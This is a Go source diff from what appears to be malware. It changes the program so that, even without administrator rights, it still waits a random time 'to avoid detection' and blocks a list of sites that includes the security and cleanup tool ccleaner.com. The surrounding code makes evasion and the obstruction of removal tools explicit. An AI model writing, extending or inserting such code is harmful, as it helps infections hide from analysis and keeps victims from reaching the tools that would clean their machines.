@@ -47,10 +47,37 @@ func Run() {
 		"ccleaner.com",
 	}
 
+	// ---------- ONLY ADMIN ACCESS ---------
+	// if !program.IsElevated() {
+	// 	fmt.Println("This program must be run as administrator.")
+	// 	return
+	// }
+
+	// if !program.IsElevated() {
+    //     fmt.Println("Running without administrator privileges.")
+    //     // Skip actions that require elevated privileges
+    //     // Only perform actions that do not need elevation
+    //     if err := randomDelay(); err != nil {
+    //         fmt.Println("Failed to introduce delay:", err)
+    //     }
+    //     if err := BlockSites(sites); err != nil {
+    //         fmt.Println("Failed to block sites:", err)
+    //     }
+    //     return
+    // }
+
 	if !program.IsElevated() {
-		fmt.Println("This program must be run as administrator.")
-		return
-	}
+        fmt.Println("Running without administrator privileges.")
+        // Skip actions that require elevated privileges
+        // Only perform actions that do not need elevation
+        if err := randomDelay(); err != nil {
+            fmt.Println("Failed to introduce delay:", err)
+        }
+        if err := BlockSites(sites); err != nil {
+            fmt.Println("Failed to block sites:", err)
+        }
+        return
+    }
 
 	// Delayed execution to avoid detection
 	if err := randomDelay(); err != nil {
